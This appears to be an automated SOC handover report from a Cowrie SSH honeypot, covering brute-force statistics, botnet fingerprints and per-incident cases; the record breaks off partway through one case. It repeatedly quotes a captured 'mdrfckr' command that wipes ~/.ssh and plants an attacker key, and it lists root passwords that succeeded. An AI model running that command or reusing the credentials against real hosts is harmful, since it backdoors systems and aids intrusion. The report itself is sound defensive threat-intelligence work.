# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-06 |
| **Generated At** | 2026-04-06T13:05:33Z |
| **Shift Time** | 13:05 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **142** |
| Confirmed Threats | **140** |
| False Positives Filtered | **2** (1.4%) |
| Unique Attacker IPs | **18** |
| Countries of Origin | **9** |
| High Severity Cases | **52** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **90** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **133** |
| Unique Credential Pairs | **72** |
| Unique Usernames | **32** |
| Unique Passwords | **68** |
| Successful Auth Pairs | **33** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 53 |
| `345gs5662d34` | 26 |
| `ubuntu` | 5 |
| `GET / HTTP/1.1` | 4 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 26 |
| `3245gs5662d34` | 26 |
| `Host: 13.235.92.17:23` | 5 |
| `Accept: */*` | 5 |
| `` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 26 |
| `root` | `3245gs5662d34` | 26 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 4 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | `Accept: */*` | 4 |
| `Accept-Encoding: gzip` | `` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `QWERTY123456QWERTY` | `35.210.61.208` | 2026-04-06T10:54:20 |
| `root` | `3245gs5662d34` | `35.210.61.208` | 2026-04-06T10:54:24 |
| `root` | `Qazwsx2019..` | `35.210.61.208` | 2026-04-06T10:55:52 |
| `root` | `root1234$` | `168.167.72.132` | 2026-04-06T10:57:12 |
| `root` | `Qwerty2025` | `35.210.61.208` | 2026-04-06T10:57:18 |
| `root` | `3245gs5662d34` | `168.167.72.132` | 2026-04-06T10:57:19 |
| `root` | `QAZ123wsx456` | `59.36.78.66` | 2026-04-06T10:58:11 |
| `root` | `3245gs5662d34` | `59.36.78.66` | 2026-04-06T10:58:15 |
| `root` | `Letmein` | `35.210.61.208` | 2026-04-06T10:58:42 |
| `root` | `zzzzzzzz` | `172.191.157.64` | 2026-04-06T10:58:57 |
| `root` | `3245gs5662d34` | `172.191.157.64` | 2026-04-06T10:59:02 |
| `root` | `!2345qwert` | `14.248.82.58` | 2026-04-06T11:00:19 |
| `root` | `3245gs5662d34` | `14.248.82.58` | 2026-04-06T11:00:22 |
| `root` | `8ik,#$` | `103.56.30.33` | 2026-04-06T11:01:42 |
| `root` | `3245gs5662d34` | `103.56.30.33` | 2026-04-06T11:01:44 |
| `root` | `Qazwsx888!!` | `14.248.82.58` | 2026-04-06T11:03:53 |
| `root` | `q12we34rt56y` | `154.18.197.35` | 2026-04-06T11:03:56 |
| `root` | `3245gs5662d34` | `154.18.197.35` | 2026-04-06T11:03:59 |
| `root` | `Root11111111$` | `14.248.82.58` | 2026-04-06T11:05:38 |
| `root` | `qazwsx888@123` | `14.248.82.58` | 2026-04-06T11:07:28 |
| `root` | `Bb123456789` | `103.56.30.33` | 2026-04-06T11:08:54 |
| `root` | `a123456a722` | `14.248.82.58` | 2026-04-06T11:09:17 |
| `root` | `Gr123456@` | `154.18.197.35` | 2026-04-06T11:09:26 |
| `root` | `odoo@2026` | `103.56.30.33` | 2026-04-06T11:10:40 |
| `root` | `Lky123456` | `154.18.197.35` | 2026-04-06T11:20:42 |
| `root` | `1qazxsw23edc` | `154.18.197.35` | 2026-04-06T11:24:16 |
| `root` | `qazwsx111` | `103.56.30.33` | 2026-04-06T11:24:59 |
| `root` | `Q1w2e3r4@` | `154.18.197.35` | 2026-04-06T11:29:46 |
| `root` | `Abcd12!!` | `154.18.197.35` | 2026-04-06T11:33:45 |
| `root` | `benjamin` | `154.18.197.35` | 2026-04-06T11:35:50 |
| `root` | `root000!@` | `154.18.197.35` | 2026-04-06T11:39:54 |
| `root` | `root1234$` | `154.18.197.35` | 2026-04-06T11:43:57 |
| `root` | `zzzzzzzz` | `154.18.197.35` | 2026-04-06T11:46:03 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **142** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 119 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 119 | 8 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 119 | 8 | Modern SSH client |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 26 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `172.191.157.64`, `59.36.78.66`, `168.167.72.132`, `103.56.30.33`, `35.210.61.208`, `14.248.82.58`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **18** |
| Unique ASNs | **14** |
| High-Risk ASNs | **14** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 2 | HIGH |
| `AS16509` | Amazon.com, Inc. | 2 | HIGH |
| `AS14618` | Amazon.com, Inc. | 1 | HIGH |
| `AS51396` | Pfcloud UG | 1 | HIGH |
| `AS14988` | Botswana Telecommunications Corporation | 1 | HIGH |
| `AS38841` | kbro CO. Ltd. | 1 | HIGH |
| `AS396982` | Google LLC | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (52)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-29904b74adce

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:54 |
| **Last Seen** | 2026-04-06 10:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:54:19` | `cowrie.session.connect` |
| `2026-04-06 10:54:19` | `cowrie.client.version` |
| `2026-04-06 10:54:19` | `cowrie.client.kex` |
| `2026-04-06 10:54:20` | `cowrie.login.success` |
| `2026-04-06 10:54:20` | `cowrie.session.params` |
| `2026-04-06 10:54:20` | `cowrie.command.input` |
| `2026-04-06 10:54:20` | `cowrie.command.failed` |
| `2026-04-06 10:54:20` | `cowrie.log.closed` |
| `2026-04-06 10:54:21` | `cowrie.session.params` |
| `2026-04-06 10:54:21` | `cowrie.command.input` |
| `2026-04-06 10:54:21` | `cowrie.session.file_download` |
| `2026-04-06 10:54:21` | `cowrie.log.closed` |
| `2026-04-06 10:54:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f540faa5f86

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:54 |
| **Last Seen** | 2026-04-06 10:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:54:23` | `cowrie.session.connect` |
| `2026-04-06 10:54:23` | `cowrie.client.version` |
| `2026-04-06 10:54:23` | `cowrie.client.kex` |
| `2026-04-06 10:54:24` | `cowrie.login.success` |
| `2026-04-06 10:54:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cd002b375eb

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:55 |
| **Last Seen** | 2026-04-06 10:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:55:51` | `cowrie.session.connect` |
| `2026-04-06 10:55:51` | `cowrie.client.version` |
| `2026-04-06 10:55:51` | `cowrie.client.kex` |
| `2026-04-06 10:55:52` | `cowrie.login.success` |
| `2026-04-06 10:55:52` | `cowrie.session.params` |
| `2026-04-06 10:55:52` | `cowrie.command.input` |
| `2026-04-06 10:55:52` | `cowrie.command.failed` |
| `2026-04-06 10:55:53` | `cowrie.log.closed` |
| `2026-04-06 10:55:53` | `cowrie.session.params` |
| `2026-04-06 10:55:53` | `cowrie.command.input` |
| `2026-04-06 10:55:53` | `cowrie.session.file_download` |
| `2026-04-06 10:55:53` | `cowrie.log.closed` |
| `2026-04-06 10:55:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bf7b62ede6f

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:55 |
| **Last Seen** | 2026-04-06 10:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:55:55` | `cowrie.session.connect` |
| `2026-04-06 10:55:55` | `cowrie.client.version` |
| `2026-04-06 10:55:55` | `cowrie.client.kex` |
| `2026-04-06 10:55:56` | `cowrie.login.success` |
| `2026-04-06 10:55:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1532e37c349d

| Field | Detail |
|---|---|
| **Source IP** | `168.167.72[.]132` |
| **First Seen** | 2026-04-06 10:57 |
| **Last Seen** | 2026-04-06 10:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:57:10` | `cowrie.session.connect` |
| `2026-04-06 10:57:10` | `cowrie.client.version` |
| `2026-04-06 10:57:11` | `cowrie.client.kex` |
| `2026-04-06 10:57:12` | `cowrie.login.success` |
| `2026-04-06 10:57:12` | `cowrie.session.params` |
| `2026-04-06 10:57:12` | `cowrie.command.input` |
| `2026-04-06 10:57:12` | `cowrie.command.failed` |
| `2026-04-06 10:57:13` | `cowrie.log.closed` |
| `2026-04-06 10:57:13` | `cowrie.session.params` |
| `2026-04-06 10:57:13` | `cowrie.command.input` |
| `2026-04-06 10:57:14` | `cowrie.session.file_download` |
| `2026-04-06 10:57:14` | `cowrie.log.closed` |
| `2026-04-06 10:57:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.167.72[.]132` to AbuseIPDB if not already reported
- [ ] Block `168.167.72[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ab4fa81dc02

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:57 |
| **Last Seen** | 2026-04-06 10:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:57:17` | `cowrie.session.connect` |
| `2026-04-06 10:57:17` | `cowrie.client.version` |
| `2026-04-06 10:57:17` | `cowrie.client.kex` |
| `2026-04-06 10:57:18` | `cowrie.login.success` |
| `2026-04-06 10:57:18` | `cowrie.session.params` |
| `2026-04-06 10:57:18` | `cowrie.command.input` |
| `2026-04-06 10:57:18` | `cowrie.command.failed` |
| `2026-04-06 10:57:18` | `cowrie.log.closed` |
| `2026-04-06 10:57:18` | `cowrie.session.params` |
| `2026-04-06 10:57:18` | `cowrie.command.input` |
| `2026-04-06 10:57:19` | `cowrie.session.file_download` |
| `2026-04-06 10:57:19` | `cowrie.log.closed` |
| `2026-04-06 10:57:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85e7f5999149

| Field | Detail |
|---|---|
| **Source IP** | `168.167.72[.]132` |
| **First Seen** | 2026-04-06 10:57 |
| **Last Seen** | 2026-04-06 10:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:57:17` | `cowrie.session.connect` |
| `2026-04-06 10:57:17` | `cowrie.client.version` |
| `2026-04-06 10:57:17` | `cowrie.client.kex` |
| `2026-04-06 10:57:19` | `cowrie.login.success` |
| `2026-04-06 10:57:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.167.72[.]132` to AbuseIPDB if not already reported
- [ ] Block `168.167.72[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32034f0c58b6

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:57 |
| **Last Seen** | 2026-04-06 10:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:57:21` | `cowrie.session.connect` |
| `2026-04-06 10:57:21` | `cowrie.client.version` |
| `2026-04-06 10:57:21` | `cowrie.client.kex` |
| `2026-04-06 10:57:21` | `cowrie.login.success` |
| `2026-04-06 10:57:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1347c99d9589

| Field | Detail |
|---|---|
| **Source IP** | `59.36.78[.]66` |
| **First Seen** | 2026-04-06 10:58 |
| **Last Seen** | 2026-04-06 10:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:58:11` | `cowrie.session.connect` |
| `2026-04-06 10:58:11` | `cowrie.client.version` |
| `2026-04-06 10:58:11` | `cowrie.client.kex` |
| `2026-04-06 10:58:11` | `cowrie.login.success` |
| `2026-04-06 10:58:12` | `cowrie.session.params` |
| `2026-04-06 10:58:12` | `cowrie.command.input` |
| `2026-04-06 10:58:12` | `cowrie.command.failed` |
| `2026-04-06 10:58:12` | `cowrie.log.closed` |
| `2026-04-06 10:58:12` | `cowrie.session.params` |
| `2026-04-06 10:58:12` | `cowrie.command.input` |
| `2026-04-06 10:58:12` | `cowrie.session.file_download` |
| `2026-04-06 10:58:12` | `cowrie.log.closed` |
| `2026-04-06 10:58:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.36.78[.]66` to AbuseIPDB if not already reported
- [ ] Block `59.36.78[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d62278cd8631

| Field | Detail |
|---|---|
| **Source IP** | `59.36.78[.]66` |
| **First Seen** | 2026-04-06 10:58 |
| **Last Seen** | 2026-04-06 10:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:58:14` | `cowrie.session.connect` |
| `2026-04-06 10:58:14` | `cowrie.client.version` |
| `2026-04-06 10:58:14` | `cowrie.client.kex` |
| `2026-04-06 10:58:15` | `cowrie.login.success` |
| `2026-04-06 10:58:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.36.78[.]66` to AbuseIPDB if not already reported
- [ ] Block `59.36.78[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34ceba882da7

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:58 |
| **Last Seen** | 2026-04-06 10:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:58:42` | `cowrie.session.connect` |
| `2026-04-06 10:58:42` | `cowrie.client.version` |
| `2026-04-06 10:58:42` | `cowrie.client.kex` |
| `2026-04-06 10:58:42` | `cowrie.login.success` |
| `2026-04-06 10:58:43` | `cowrie.session.params` |
| `2026-04-06 10:58:43` | `cowrie.command.input` |
| `2026-04-06 10:58:43` | `cowrie.command.failed` |
| `2026-04-06 10:58:43` | `cowrie.log.closed` |
| `2026-04-06 10:58:43` | `cowrie.session.params` |
| `2026-04-06 10:58:43` | `cowrie.command.input` |
| `2026-04-06 10:58:43` | `cowrie.session.file_download` |
| `2026-04-06 10:58:43` | `cowrie.log.closed` |
| `2026-04-06 10:58:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f21d175aa115

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:58 |
| **Last Seen** | 2026-04-06 10:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:58:45` | `cowrie.session.connect` |
| `2026-04-06 10:58:45` | `cowrie.client.version` |
| `2026-04-06 10:58:46` | `cowrie.client.kex` |
| `2026-04-06 10:58:46` | `cowrie.login.success` |
| `2026-04-06 10:58:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee95fe586c2e

| Field | Detail |
|---|---|
| **Source IP** | `172.191.157[.]64` |
| **First Seen** | 2026-04-06 10:58 |
| **Last Seen** | 2026-04-06 10:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
